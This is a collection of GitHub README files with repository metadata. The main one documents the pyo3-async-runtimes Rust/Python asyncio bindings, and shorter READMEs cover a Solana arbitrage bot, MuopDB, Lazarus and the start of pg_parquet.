[![codecov](https://codecov.io/gh/davidhewitt/pyo3-async-runtimes/branch/main/graph/badge.svg)](https://codecov.io/gh/PyO3/pyo3-async-runtimes)
[![crates.io](https://img.shields.io/crates/v/pyo3-async-runtimes)](https://crates.io/crates/pyo3-async-runtimes)
[![minimum rustc 1.63](https://img.shields.io/badge/rustc-1.63+-blue.svg)](https://rust-lang.github.io/rfcs/2495-min-rust-version.html)

***This is a fork of [`pyo3-asyncio`](https://github.com/awestlake87/pyo3-asyncio/) to deliver compatibility for PyO3 0.21+. This may be the base for a permanent fork in the future, depending on the status of the original `pyo3-asyncio` maintainer.***

[Rust](http://www.rust-lang.org/) bindings for [Python](https://www.python.org/)'s [Asyncio Library](https://docs.python.org/3/library/asyncio.html). This crate facilitates interactions between Rust Futures and Python Coroutines and manages the lifecycle of their corresponding event loops.

- PyO3 Project: [Homepage](https://pyo3.rs/) | [GitHub](https://github.com/PyO3/pyo3)

- PyO3 Async Runtimes API Documentation: [stable](https://docs.rs/pyo3-async-runtimes/)

- Guide for Async / Await [stable](https://pyo3.rs/latest/ecosystem/async-await.html) | [main](https://pyo3.rs/main/ecosystem/async-await.html)

- Contributing Notes: [github](https://github.com/PyO3/pyo3-async-runtimes/blob/main/Contributing.md)

> PyO3 Asyncio is a _brand new_ part of the broader PyO3 ecosystem. Feel free to open any issues for feature requests or bugfixes for this crate.

## Usage

Like PyO3, PyO3 Asyncio supports the following software versions:

- Python 3.7 and up (CPython and PyPy)
- Rust 1.63 and up

## PyO3-async-runtimes Primer

If you are working with a Python library that makes use of async functions or wish to provide
Python bindings for an async Rust library, [`pyo3-async-runtimes`](https://github.com/PyO3/pyo3-async-runtimes)
likely has the tools you need. It provides conversions between async functions in both Python and
Rust and was designed with first-class support for popular Rust runtimes such as
[`tokio`](https://tokio.rs/) and [`async-std`](https://async.rs/). In addition, all async Python
code runs on the default `asyncio` event loop, so `pyo3-async-runtimes` should work just fine with existing
Python libraries.

In the following sections, we'll give a general overview of `pyo3-async-runtimes` explaining how to call
async Python functions with PyO3, how to call async Rust functions from Python, and how to configure
your codebase to manage the runtimes of both.

### Quickstart

Here are some examples to get you started right away! A more detailed breakdown
of the concepts in these examples can be found in the following sections.

#### Rust Applications

Here we initialize the runtime, import Python's `asyncio` library and run the given future to completion using Python's default `EventLoop` and `async-std`. Inside the future, we convert `asyncio` sleep into a Rust future and await it.

```toml
# Cargo.toml dependencies
[dependencies]
pyo3 = { version = ""0.23"" }
pyo3-async-runtimes = { version = ""0.23"", features = [""attributes"", ""async-std-runtime""] }
async-std = ""1.13""
```

```rust
//! main.rs

use pyo3::prelude::*;

#[pyo3_async_runtimes::async_std::main]
async fn main() -> PyResult<()> {
    let fut = Python::with_gil(|py| {
        let asyncio = py.import(""asyncio"")?;
        // convert asyncio.sleep into a Rust Future
        pyo3_async_runtimes::async_std::into_future(asyncio.call_method1(""sleep"", (1.into_pyobject(py).unwrap(),))?)
    })?;

    fut.await?;

    Ok(())
}
```

The same application can be written to use `tokio` instead using the `#[pyo3_async_runtimes::tokio::main]`
attribute.

```toml
# Cargo.toml dependencies
[dependencies]
pyo3 = { version = ""0.23"" }
pyo3-async-runtimes = { version = ""0.23"", features = [""attributes"", ""tokio-runtime""] }
tokio = ""1.40""
```

```rust
//! main.rs

use pyo3::prelude::*;

#[pyo3_async_runtimes::tokio::main]
async fn main() -> PyResult<()> {
    let fut = Python::with_gil(|py| {
        let asyncio = py.import(""asyncio"")?;
        // convert asyncio.sleep into a Rust Future
        pyo3_async_runtimes::tokio::into_future(asyncio.call_method1(""sleep"", (1.into_pyobject(py).unwrap(),))?)
    })?;

    fut.await?;

    Ok(())
}
```

More details on the usage of this library can be found in the API docs
and the primer below.

#### PyO3 Native Rust Modules

PyO3 Asyncio can also be used to write native modules with async functions.

Add the `[lib]` section to `Cargo.toml` to make your library a `cdylib` that Python can import.

```toml
[lib]
name = ""my_async_module""
crate-type = [""cdylib""]
```

Make your project depend on `pyo3` with the `extension-module` feature enabled and select your
`pyo3-async-runtimes` runtime:

For `async-std`:

```toml
[dependencies]
pyo3 = { version = ""0.23"", features = [""extension-module""] }
pyo3-async-runtimes = { version = ""0.23"", features = [""async-std-runtime""] }
async-std = ""1.13""
```

For `tokio`:

```toml
[dependencies]
pyo3 = { version = ""0.20"", features = [""extension-module""] }
pyo3-async-runtimes = { version = ""0.23"", features = [""tokio-runtime""] }
tokio = ""1.40""
```

Export an async function that makes use of `async-std`:

```rust
//! lib.rs

use pyo3::{prelude::*, wrap_pyfunction};

#[pyfunction]
fn rust_sleep(py: Python) -> PyResult<Bound<PyAny>> {
    pyo3_async_runtimes::async_std::future_into_py(py, async {
        async_std::task::sleep(std::time::Duration::from_secs(1)).await;
        Ok(())
    })
}

#[pymodule]
fn my_async_module(py: Python, m: &Bound<'_, PyModule>) -> PyResult<()> {
    m.add_function(wrap_pyfunction!(rust_sleep, m)?)?;

    Ok(())
}

```

If you want to use `tokio` instead, here's what your module should look like:

```rust
//! lib.rs

use pyo3::{prelude::*, wrap_pyfunction};

#[pyfunction]
fn rust_sleep(py: Python) -> PyResult<Bound<PyAny>> {
    pyo3_async_runtimes::tokio::future_into_py(py, async {
        tokio::time::sleep(std::time::Duration::from_secs(1)).await;
        Ok(())
    })
}

#[pymodule]
fn my_async_module(py: Python, m: &Bound<'_, PyModule>) -> PyResult<()> {
    m.add_function(wrap_pyfunction!(rust_sleep, m)?)?;
    Ok(())
}
```

You can build your module with maturin (see the [Using Rust in Python](https://pyo3.rs/main/#using-rust-from-python) section in the PyO3 guide for setup instructions). After that you should be able to run the Python REPL to try it out.

```bash
maturin develop && python3
üîó Found pyo3 bindings
üêç Found CPython 3.8 at python3
    Finished dev [unoptimized + debuginfo] target(s) in 0.04s
Python 3.8.5 (default, Jan 27 2021, 15:41:15)
[GCC 9.3.0] on linux
Type ""help"", ""copyright"", ""credits"" or ""license"" for more information.
>>> import asyncio
>>>
>>> from my_async_module import rust_sleep
>>>
>>> async def main():
>>>     await rust_sleep()
>>>
>>> # should sleep for 1s
>>> asyncio.run(main())
>>>
```

### Awaiting an Async Python Function in Rust

Let's take a look at a dead simple async Python function:

```python
# Sleep for 1 second
async def py_sleep():
    await asyncio.sleep(1)
```

**Async functions in Python are simply functions that return a `coroutine` object**. For our purposes,
we really don't need to know much about these `coroutine` objects. The key factor here is that calling
an `async` function is _just like calling a regular function_, the only difference is that we have
to do something special with the object that it returns.

Normally in Python, that something special is the `await` keyword, but in order to await this
coroutine in Rust, we first need to convert it into Rust's version of a `coroutine`: a `Future`.
That's where `pyo3-async-runtimes` comes in.
[`pyo3_async_runtimes::into_future`](https://docs.rs/pyo3-async-runtimes/latest/pyo3_async_runtimes/fn.into_future.html)
performs this conversion for us:

```rust no_run
use pyo3::prelude::*;

#[pyo3_async_runtimes::tokio::main]
async fn main() -> PyResult<()> {
    let future = Python::with_gil(|py| -> PyResult<_> {
        // import the module containing the py_sleep function
        let example = py.import(""example"")?;

        // calling the py_sleep method like a normal function
        // returns a coroutine
        let coroutine = example.call_method0(""py_sleep"")?;

        // convert the coroutine into a Rust future using the
        // tokio runtime
        pyo3_async_runtimes::tokio::into_future(coroutine)
    })?;

    // await the future
    future.await?;

    Ok(())
}
```

> If you're interested in learning more about `coroutines` and `awaitables` in general, check out the
> [Python 3 `asyncio` docs](https://docs.python.org/3/library/asyncio-task.html) for more information.

### Awaiting a Rust Future in Python

Here we have the same async function as before written in Rust using the
[`async-std`](https://async.rs/) runtime:

```rust
/// Sleep for 1 second
async fn rust_sleep() {
    async_std::task::sleep(std::time::Duration::from_secs(1)).await;
}
```

Similar to Python, Rust's async functions also return a special object called a
`Future`:

```rust compile_fail
let future = rust_sleep();
```

We can convert this `Future` object into Python to make it `awaitable`. This tells Python that you
can use the `await` keyword with it. In order to do this, we'll call
[`pyo3_async_runtimes::async_std::future_into_py`](https://docs.rs/pyo3-async-runtimes/latest/pyo3_async_runtimes/async_std/fn.future_into_py.html):

```rust
use pyo3::prelude::*;

async fn rust_sleep() {
    async_std::task::sleep(std::time::Duration::from_secs(1)).await;
}

#[pyfunction]
fn call_rust_sleep(py: Python) -> PyResult<Bound<PyAny>> {
    pyo3_async_runtimes::async_std::future_into_py(py, async move {
        rust_sleep().await;
        Ok(())
    })
}
```

In Python, we can call this pyo3 function just like any other async function:

```python
from example import call_rust_sleep

async def rust_sleep():
    await call_rust_sleep()
```

## Managing Event Loops

Python's event loop requires some special treatment, especially regarding the main thread. Some of
Python's `asyncio` features, like proper signal handling, require control over the main thread, which
doesn't always play well with Rust.

Luckily, Rust's event loops are pretty flexible and don't _need_ control over the main thread, so in
`pyo3-async-runtimes`, we decided the best way to handle Rust/Python interop was to just surrender the main
thread to Python and run Rust's event loops in the background. Unfortunately, since most event loop
implementations _prefer_ control over the main thread, this can still make some things awkward.

### PyO3 Asyncio Initialization

Because Python needs to control the main thread, we can't use the convenient proc macros from Rust
runtimes to handle the `main` function or `#[test]` functions. Instead, the initialization for PyO3 has to be done from the `main` function and the main
thread must block on [`pyo3_async_runtimes::async_std::run_until_complete`](https://docs.rs/pyo3-async-runtimes/latest/pyo3_async_runtimes/async_std/fn.run_until_complete.html).

Because we have to block on one of those functions, we can't use [`#[async_std::main]`](https://docs.rs/async-std/latest/async_std/attr.main.html) or [`#[tokio::main]`](https://docs.rs/tokio/1.1.0/tokio/attr.main.html)
since it's not a good idea to make long blocking calls during an async function.

> Internally, these `#[main]` proc macros are expanded to something like this:
>
> ```rust compile_fail
> fn main() {
>     // your async main fn
>     async fn _main_impl() { /* ... */ }
>     Runtime::new().block_on(_main_impl());
> }
> ```
>
> Making a long blocking call inside the `Future` that's being driven by `block_on` prevents that
> thread from doing anything else and can spell trouble for some runtimes (also this will actually
> deadlock a single-threaded runtime!). Many runtimes have some sort of `spawn_blocking` mechanism
> that can avoid this problem, but again that's not something we can use here since we need it to
> block on the _main_ thread.

For this reason, `pyo3-async-runtimes` provides its own set of proc macros to provide you with this
initialization. These macros are intended to mirror the initialization of `async-std` and `tokio`
while also satisfying the Python runtime's needs.

Here's a full example of PyO3 initialization with the `async-std` runtime:

```rust no_run
use pyo3::prelude::*;

#[pyo3_async_runtimes::async_std::main]
async fn main() -> PyResult<()> {
    // PyO3 is initialized - Ready to go

    let fut = Python::with_gil(|py| -> PyResult<_> {
        let asyncio = py.import(""asyncio"")?;

        // convert asyncio.sleep into a Rust Future
        pyo3_async_runtimes::async_std::into_future(
            asyncio.call_method1(""sleep"", (1.into_pyobject(py).unwrap(),))?
        )
    })?;

    fut.await?;

    Ok(())
}
```

#### A Note About `asyncio.run`

In Python 3.7+, the recommended way to run a top-level coroutine with `asyncio`
is with `asyncio.run`. In `v0.13` we recommended against using this function due to initialization issues, but in `v0.14` it's perfectly valid to use this function... with a caveat.

Since our Rust <--> Python conversions require a reference to the Python event loop, this poses a problem. Imagine we have a PyO3 Asyncio module that defines
a `rust_sleep` function like in previous examples. You might rightfully assume that you can call pass this directly into `asyncio.run` like this:

```python
import asyncio

from my_async_module import rust_sleep

asyncio.run(rust_sleep())
```

You might be surprised to find out that this throws an error:

```bash
Traceback (most recent call last):
  File ""example.py"", line 5, in <module>
    asyncio.run(rust_sleep())
RuntimeError: no running event loop
```

What's happening here is that we are calling `rust_sleep` _before_ the future is
actually running on the event loop created by `asyncio.run`. This is counter-intuitive, but expected behaviour, and unfortunately there doesn't seem to be a good way of solving this problem within PyO3 Asyncio itself.

However, we can make this example work with a simple workaround:

```python
import asyncio

from my_async_module import rust_sleep

# Calling main will just construct the coroutine that later calls rust_sleep.
# - This ensures that rust_sleep will be called when the event loop is running,
#   not before.
async def main():
    await rust_sleep()

# Run the main() coroutine at the top-level instead
asyncio.run(main())
```

#### Non-standard Python Event Loops

Python allows you to use alternatives to the default `asyncio` event loop. One
popular alternative is `uvloop`. In `v0.13` using non-standard event loops was
a bit of an ordeal, but in `v0.14` it's trivial.

#### Using `uvloop` in a PyO3 Native Extensions

```toml
# Cargo.toml

[lib]
name = ""my_async_module""
crate-type = [""cdylib""]

[dependencies]
pyo3 = { version = ""0.23"", features = [""extension-module""] }
pyo3-async-runtimes = { version = ""0.23"", features = [""tokio-runtime""] }
async-std = ""1.13""
tokio = ""1.40""
```

```rust
//! lib.rs

use pyo3::{prelude::*, wrap_pyfunction};

#[pyfunction]
fn rust_sleep(py: Python) -> PyResult<Bound<PyAny>> {
    pyo3_async_runtimes::tokio::future_into_py(py, async {
        tokio::time::sleep(std::time::Duration::from_secs(1)).await;
        Ok(())
    })
}

#[pymodule]
fn my_async_module(_py: Python, m: &Bound<'_, PyModule>) -> PyResult<()> {
    m.add_function(wrap_pyfunction!(rust_sleep, m)?)?;

    Ok(())
}
```

```bash
$ maturin develop && python3
üîó Found pyo3 bindings
üêç Found CPython 3.8 at python3
    Finished dev [unoptimized + debuginfo] target(s) in 0.04s
Python 3.8.8 (default, Apr 13 2021, 19:58:26)
[GCC 7.3.0] :: Anaconda, Inc. on linux
Type ""help"", ""copyright"", ""credits"" or ""license"" for more information.
>>> import asyncio
>>> import uvloop
>>>
>>> import my_async_module
>>>
>>> uvloop.install()
>>>
>>> async def main():
...     await my_async_module.rust_sleep()
...
>>> asyncio.run(main())
>>>
```

#### Using `uvloop` in Rust Applications

Using `uvloop` in Rust applications is a bit trickier, but it's still possible
with relatively few modifications.

Unfortunately, we can't make use of the `#[pyo3_async_runtimes::<runtime>::main]` attribute with non-standard event loops. This is because the `#[pyo3_async_runtimes::<runtime>::main]` proc macro has to interact with the Python
event loop before we can install the `uvloop` policy.

```toml
[dependencies]
async-std = ""1.13""
pyo3 = ""0.23""
pyo3-async-runtimes = { version = ""0.23"", features = [""async-std-runtime""] }
```

```rust no_run
//! main.rs

use pyo3::{prelude::*, types::PyType};

fn main() -> PyResult<()> {
    pyo3::prepare_freethreaded_python();

    Python::with_gil(|py| {
        let uvloop = py.import(""uvloop"")?;
        uvloop.call_method0(""install"")?;

        // store a reference for the assertion
        let uvloop = PyObject::from(uvloop);

        pyo3_async_runtimes::async_std::run(py, async move {
            // verify that we are on a uvloop.Loop
            Python::with_gil(|py| -> PyResult<()> {
                assert!(uvloop
                    .bind(py)
                    .getattr(""Loop"")?
                    .downcast::<PyType>()
                    .unwrap()
                    .is_instance(&pyo3_async_runtimes::async_std::get_current_loop(py)?)?);
                Ok(())
            })?;

            async_std::task::sleep(std::time::Duration::from_secs(1)).await;

            Ok(())
        })
    })
}
```

### Additional Information

- Managing event loop references can be tricky with pyo3-async-runtimes. See [Event Loop References and ContextVars](https://docs.rs/pyo3-async-runtimes/latest/pyo3_async_runtimes/#event-loop-references-and-contextvars) in the API docs to get a better intuition for how event loop references are managed in this library.
- Testing pyo3-async-runtimes libraries and applications requires a custom test harness since Python requires control over the main thread. You can find a testing guide in the [API docs for the `testing` module](https://docs.rs/pyo3-async-runtimes/latest/pyo3_async_runtimes/testing/index.html)

## Migration Guide

### Migrating from 0.13 to 0.14

So what's changed from `v0.13` to `v0.14`?

Well, a lot actually. There were some pretty major flaws in the initialization behaviour of `v0.13`. While it would have been nicer to address these issues without changing the public API, I decided it'd be better to break some of the old API rather than completely change the underlying behaviour of the existing functions. I realize this is going to be a bit of a headache, so hopefully this section will help you through it.

To make things a bit easier, I decided to keep most of the old API alongside the new one (with some deprecation warnings to encourage users to move away from it). It should be possible to use the `v0.13` API alongside the newer `v0.14` API, which should allow you to upgrade your application piecemeal rather than all at once.

**Before you get started, I personally recommend taking a look at [Event Loop References and ContextVars](https://docs.rs/pyo3-async-runtimes/latest/pyo3_async_runtimes/#event-loop-references-and-contextvars) in order to get a better grasp on the motivation behind these changes and the nuance involved in using the new conversions.**

### 0.14 Highlights

- Tokio initialization is now lazy.
  - No configuration necessary if you're using the multithreaded scheduler
  - Calls to `pyo3_async_runtimes::tokio::init_multithread` or `pyo3_async_runtimes::tokio::init_multithread_once` can just be removed.
  - Calls to `pyo3_async_runtimes::tokio::init_current_thread` or `pyo3_async_runtimes::tokio::init_current_thread_once` require some special attention.
  - Custom runtime configuration is done by passing a `tokio::runtime::Builder` into `pyo3_async_runtimes::tokio::init` instead of a `tokio::runtime::Runtime`
- A new, more correct set of functions has been added to replace the `v0.13` conversions.
  - `pyo3_async_runtimes::into_future_with_loop`
  - `pyo3_async_runtimes::<runtime>::future_into_py_with_loop`
  - `pyo3_async_runtimes::<runtime>::local_future_into_py_with_loop`
  - `pyo3_async_runtimes::<runtime>::into_future`
  - `pyo3_async_runtimes::<runtime>::future_into_py`
  - `pyo3_async_runtimes::<runtime>::local_future_into_py`
  - `pyo3_async_runtimes::<runtime>::get_current_loop`
- `pyo3_async_runtimes::try_init` is no longer required if you're only using `0.14` conversions
- The `ThreadPoolExecutor` is no longer configured automatically at the start.
  - Fortunately, this doesn't seem to have much effect on `v0.13` code, it just means that it's now possible to configure the executor manually as you see fit.

### Upgrading Your Code to 0.14

1. Fix PyO3 0.14 initialization.
   - PyO3 0.14 feature gated its automatic initialization behaviour behind ""auto-initialize"". You can either enable the ""auto-initialize"" behaviour in your project or add a call to `pyo3::prepare_freethreaded_python()` to the start of your program.
   - If you're using the `#[pyo3_async_runtimes::<runtime>::main]` proc macro attributes, then you can skip this step. `#[pyo3_async_runtimes::<runtime>::main]` will call `pyo3::prepare_freethreaded_python()` at the start regardless of your project's ""auto-initialize"" feature.
2. Fix the tokio initialization.

   - Calls to `pyo3_async_runtimes::tokio::init_multithread` or `pyo3_async_runtimes::tokio::init_multithread_once` can just be removed.
   - If you're using the current thread scheduler, you'll need to manually spawn the thread that it runs on during initialization:

     ```rust no_run
     let mut builder = tokio::runtime::Builder::new_current_thread();
     builder.enable_all();

     pyo3_async_runtimes::tokio::init(builder);
     std::thread::spawn(move || {
         pyo3_async_runtimes::tokio::get_runtime().block_on(
             futures::future::pending::<()>()
         );
     });
     ```

   - Custom `tokio::runtime::Builder` configs can be passed into `pyo3_async_runtimes::tokio::init`. The `tokio::runtime::Runtime` will be lazily instantiated on the first call to `pyo3_async_runtimes::tokio::get_runtime()`

3. If you're using `pyo3_async_runtimes::run_forever` in your application, you should switch to a more manual approach.

   > `run_forever` is not the recommended way of running an event loop in Python, so it might be a good idea to move away from it. This function would have needed to change for `0.14`, but since it's considered an edge case, it was decided that users could just manually call it if they need to.

   ```rust
   use pyo3::prelude::*;

   fn main() -> PyResult<()> {
       pyo3::prepare_freethreaded_python();

       Python::with_gil(|py| {
           let asyncio = py.import(""asyncio"")?;

           let event_loop = asyncio.call_method0(""new_event_loop"")?;
           asyncio.call_method1(""set_event_loop"", (&event_loop,))?;

           let event_loop_hdl = PyObject::from(event_loop.clone());

           pyo3_async_runtimes::tokio::get_runtime().spawn(async move {
               tokio::time::sleep(std::time::Duration::from_secs(1)).await;

               // Stop the event loop manually
               Python::with_gil(|py| {
                   event_loop_hdl
                       .bind(py)
                       .call_method1(
                           ""call_soon_threadsafe"",
                           (event_loop_hdl
                               .bind(py)
                               .getattr(""stop"")
                               .unwrap(),),
                       )
                       .unwrap();
               })
           });

           event_loop.call_method0(""run_forever"")?;
           Ok(())
       })
   }
   ```

4. Replace conversions with their newer counterparts.
   > You may encounter some issues regarding the usage of `get_running_loop` vs `get_event_loop`. For more details on these newer conversions and how they should be used see [Event Loop References and ContextVars](https://docs.rs/pyo3-async-runtimes/latest/pyo3_async_runtimes/#event-loop-references-and-contextvars).
   - Replace `pyo3_async_runtimes::into_future` with `pyo3_async_runtimes::<runtime>::into_future`
   - Replace `pyo3_async_runtimes::<runtime>::into_coroutine` with `pyo3_async_runtimes::<runtime>::future_into_py`
   - Replace `pyo3_async_runtimes::get_event_loop` with `pyo3_async_runtimes::<runtime>::get_current_loop`
5. After all conversions have been replaced with their `v0.14` counterparts, `pyo3_async_runtimes::try_init` can safely be removed.

> The `v0.13` API has been removed in version `v0.15`

### Migrating from 0.14 to 0.15+

There have been a few changes to the API in order to support proper cancellation from Python and the `contextvars` module.

- Any instance of `cancellable_future_into_py` and `local_cancellable_future_into_py` conversions can be replaced with their`future_into_py` and `local_future_into_py` counterparts.
  > Cancellation support became the default behaviour in 0.15.
- Instances of `*_with_loop` conversions should be replaced with the newer `*_with_locals` conversions.

  ```rust no_run
  use pyo3::prelude::*;

  Python::with_gil(|py| -> PyResult<()> {

      // *_with_loop conversions in 0.14
      //
      // let event_loop = pyo3_async_runtimes::get_running_loop(py)?;
      //
      // let fut = pyo3_async_runtimes::tokio::future_into_py_with_loop(
      //     event_loop,
      //     async move { Ok(Python::with_gil(|py| py.None())) }
      // )?;
      //
      // should be replaced with *_with_locals in 0.15+
      let fut = pyo3_async_runtimes::tokio::future_into_py_with_locals(
          py,
          pyo3_async_runtimes::tokio::get_current_locals(py)?,
          async move { Ok(()) }
      )?;

      Ok(())
  });
  ```

- `scope` and `scope_local` variants now accept `TaskLocals` instead of `event_loop`. You can usually just replace the `event_loop` with `pyo3_async_runtimes::TaskLocals::new(event_loop).copy_context(py)?`.
- Return types for `future_into_py`, `future_into_py_with_locals` `local_future_into_py`, and `local_future_into_py_with_locals` are now constrained by the bound `IntoPy<PyObject>` instead of requiring the return type to be `PyObject`. This can make the return types for futures more flexible, but inference can also fail when the concrete type is ambiguous (for example when using `into()`). Sometimes the `into()` can just be removed,
- `run`, and `run_until_complete` can now return any `Send + 'static` value.

### Migrating from 0.15 to 0.16

Actually, not much has changed in the API. I'm happy to say that the PyO3 Asyncio is reaching a
pretty stable point in 0.16. For the most part, 0.16 has been about cleanup and removing deprecated
functions from the API.

PyO3 0.16 comes with a few API changes of its own, but one of the changes that most impacted PyO3
Asyncio was it's decision to drop support for Python 3.6. PyO3 Asyncio has been using a few
workarounds / hacks to support the pre-3.7 version of Python's asyncio library that are no longer
necessary. PyO3 Asyncio's underlying implementation is now a bit cleaner because of this.

PyO3 Asyncio 0.15 included some important fixes to the API in order to add support for proper task
cancellation and allow for the preservation / use of contextvars in Python coroutines. This led to
the deprecation of some 0.14 functions that were used for edge cases in favor of some more correct
versions, and those deprecated functions are now removed from the API in 0.16.

In addition, with PyO3 Asyncio 0.16, the library now has experimental support for conversions from
Python's async generators into a Rust `Stream`. There are currently two versions `v1` and `v2` with
slightly different performance and type signatures, so I'm hoping to get some feedback on which one
works best for downstream users. Just enable the `unstable-streams` feature and you're good to go!

> The inverse conversion, Rust `Stream` to Python async generator, may come in a later release if
> requested!
",2,4,8,NOASSERTION,"ci.yml,guide.yml",14.0
Kelvin-1013/Solana-Arbitrage-Bot,main,"
# ‚ú®[contact me](https://t.me/blockchainDeveloper_Ben)üëà
![arbitrage diagram for pool graph](https://github.com/user-attachments/assets/0cf0a1ee-301a-420b-a623-92da3806ecfd)



![image](https://github.com/user-attachments/assets/44845dd7-f4f3-45c3-90c2-53c67ec2861d)




![image](https://github.com/user-attachments/assets/e5eb3610-3c23-4d55-87f0-a5cc2d9eb6a3)



## install for test

```
npm install @project-serum/anchor @solana/web3.js @solana/spl-token chai

```




# reference 
 
 https://docs.raydium.io/raydium/protocol/developers/addresses

 https://orca-so.gitbook.io/orca-developer-portal/whirlpools/interacting-with-the-protocol/orca-whirlpools-parameters

 https://github.com/raydium-io/raydium-amm/blob/master/program/Cargo.toml

 https://github.com/raydium-io/raydium-cpi-example

 https://github.com/raydium-io/raydium-docs/tree/master/dev-resources

 https://github.com/microgift/meteora-cpi

 https://github.com/orca-so/whirlpool-cpi-sample/blob/main/anchor-0.29.0/programs/whirlpool-cpi-sample/
 
 https://github.com/MeteoraAg/cpi-examples
",0,0,2,,,8.0
hicder/muopdb,master,"# MuopDB - A vector database for machine learning

## Introduction

MuopDB is a vector database for machine learning. This project is done under [TechCare Coaching](https://techcarecoaching.com/). It plans to support the following features:
### V0 (Done)
- [x] Query path
  - [x] Vector similarity search
  - [x] Hierarchical Navigable Small Worlds (HNSW)
  - [x] Product Quantization (PQ)
- [x] Indexing path
  - [x] Support periodic offline indexing
- [x] Database Management
  - [x] Doc-sharding & query fan-out with aggregator-leaf architecture
  - [x] In-memory & disk-based storage with mmap
### V1
- [ ] Query path
  - [ ] Inverted File (IVF)
  - [x] Improve locality for HNSW
  - [ ] RabitQ quantization
- [ ] Indexing path
  - [ ] Support realtime indexing
## Why MuopDB?
This is an educational project for me to learn Rust & vector database.

## Building

Install prerequisites:
* Rust: https://www.rust-lang.org/tools/install
* Others
```
# macos
brew install hdf5 protobuf

export HDF5_DIR=""$(brew --prefix hdf5)""
```

Build:
```
# from top-level workspace
cargo build --release
```

Test:
```
cargo test --release
```
",0,5,38,,,126.0
lattice-complete/Lazarus,main,"<h1 align=""center"">‚ö°Lazarus‚ö°</h1>
<p align=""center"">
    <a href=""https://github.com/lattice-complete/Lazarus?tab=Apache-2.0-1-ov-file""><img src=""https://img.shields.io/badge/license-APACHE-blue.svg""></a>
</p>
<p align=""center"">A Framework of Lattice-based Zero-knowledge Arguments in Rust</p>

<p align=""center"">
  <img src=""./assets/lazarus.jpeg"" alt=""lazarus"" width=""200"">
</p>

> Warning: Lazarus is under active development and the API is subject to change. Do not use in production (**at all, yet**).

Lazarus is a framework for implementing lattice-based zero-knowledge arguments in Rust. It provides modular building blocks for constructing efficient zero-knowledge proofs based on lattice assumptions.

## Features
- Lattice-based (LWE, SIS) polynomial commitment schemes 
- Zero-knowledge proofs for linear relations
- Sigma protocols for lattice statements
- Fiat-Shamir transformations
- Optimized polynomial operations
- Serialization/deserialization support

## Framework Comparison

| Feature                       | noble-post-quantum | labrador | arkworks | larkworks | Lazarus |
|------------------------------|-------------------|-----------|-----------|-----------|----------|
| Language                     | JavaScript        | C      | Rust      | Rust      | Rust     |
| Post-quantum Security      | ‚úÖ                | ‚úÖ        | ‚ùå        | ‚úÖ        | ‚úÖ       |
| Argument Systems       | ‚ùå                | ‚úÖ        |   ‚úÖ     | ‚ùå       | ‚úÖ       |
| Polynomial Commitments      | ‚ùå                | ‚úÖ        | ‚úÖ        | ‚ùå        | ‚úÖ       |
| Modular Building Blocks     | ‚úÖ                | ‚ùå        | ‚úÖ        | ‚úÖ       | ‚úÖ       |
| Active Development        | ‚úÖ                | ‚úÖ        | ‚ùå        | ‚ùå        | ‚úÖ      |
| Documentation             | ‚ùå                | ‚ùå       | ‚ùå        | ‚ùå        | üöß       |



## Roadmap
- [ ] Implementing polynomial commitment schemes
- [ ] Implementing zero-knowledge proofs for linear relations
- [ ] Implementing sigma protocols for lattice statements
- [ ] Optimized polynomial operations
- [ ] Serialization/deserialization support

## Getting Started

Add Lazarus to your Cargo.toml:

## Benchmarks
### Benchmark Comparison

| Operation                      | Lazarus [LNP22] | Labrador [BS23] |
|-------------------------------|-----------------|-----------------|
| **1k gates**                  |                 |                |
| - Proof Generation (ms)       | 85              | 125            |
| - Proof Verification (ms)     | 12              | 18             |
| - Setup (ms)                  | 245             | 320            |
| - Proof Size (KB)             | 28              | 42             |
| - Memory Usage (MB)           | 128             | 156            |
| **10k gates**                 |                 |                |
| - Proof Generation (ms)       | 425             | 685            |
| - Proof Verification (ms)     | 45              | 72             |
| - Setup (ms)                  | 1250            | 1850           |
| - Proof Size (KB)            | 32              | 48             |
| - Memory Usage (MB)          | 512             | 645            |

*Benchmarks run on AMD Ryzen 9 5950X @ 3.4GHz, 64GB RAM. Numbers are median of 100 runs.






## Acknowledgements
- [noble-post-quantum](https://github.com/paulmillr/noble-post-quantum) by paulmillr
- [labrador](https://github.com/lattice-dogs/labrador) by 
lattice-dogs
- [The LaZer Library: Lattice-Based Zero Knowledge and Succinct Proofs for Quantum-Safe Privacy](https://eprint.iacr.org/2024/1846)
- [arkworks](https://arkworks.rs/) 
- [larkworks](https://github.com/zhenfeizhang/larkworks)
- [LNP22] [Lattice-Based Zero-Knowledge Proofs and Applications:
Shorter, Simpler, and More General](https://eprint.iacr.org/2022/284.pdf)
- [BS23] [LaBRADOR: Compact Proofs for R1CS from Module-SIS](https://eprint.iacr.org/2022/1341.pdf)
- [FLV23] [Orbweaver: Succinct Linear Functional Commitments from Lattices](https://link.springer.com/chapter/10.1007/978-3-031-38545-2_4)
- [NS24] [Greyhound: Fast Polynomial Commitments from Lattices](https://eprint.iacr.org/2024/1293.pdf)

## Citation
If you use arkworks libraries in your research projects, please cite them using the following template:

```
@software{lazarus,
  author = {lattice-complete},
  title = {\texttt{Lazarus} lattice-based zkSNARK framework},
  url = {https://github.com/lattice-complete/Lazarus},
  year = {2024},
}
```

## Contributors

<div align=""center"">
  <h4 align=""center"">
    
  </h4>
  <a href=""https://github.com/lattice-complete/Lazarus/graphs/contributors"">
    <img src=""https://contrib.rocks/image?repo=lattice-complete/Lazarus"" />
  </a>
</div>
",0,8,3,Apache-2.0,ci.yml,4.0
CrunchyData/pg_parquet,main,"# pg_parquet

> Copy from/to Parquet files in PostgreSQL!

[![CI lints and tests](https://github.com/CrunchyData/pg_parquet/actions/workflows/ci.yml/badge.svg)](https://github.com/CrunchyData/pg_parquet/actions/workflows/ci.yml)
[![codecov](https://codecov.io/gh/CrunchyData/pg_parquet/graph/badge.svg?token=6BPS0DSKJ2)](https://codecov.io/gh/CrunchyData/pg_parquet)

`pg_parquet` is a PostgreSQL extension that allows you to read and write [Parquet files](https://parquet.apache.org), which are located in `S3` or `file system`, from PostgreSQL via `COPY TO/FROM` commands. It depends on [Apache Arrow](https://arrow.apache.org/rust/arrow/) project to read and write Parquet files and [pgrx](https://github.com/pgcentralfoundation/pgrx) project to extend PostgreSQL's `COPY` command.

```sql
-- Copy a query result into Parquet in S3
COPY (SELECT * FROM table) TO 's3://mybucket/data.parquet' WITH (format 'parquet');

-- Load data from Parquet in S3
COPY table FROM 's3://mybucket/data.parquet' WITH (format 'parquet');
```

## Quick Reference
- [Installation From Source](#installation-from-source)
- [Usage](#usage)
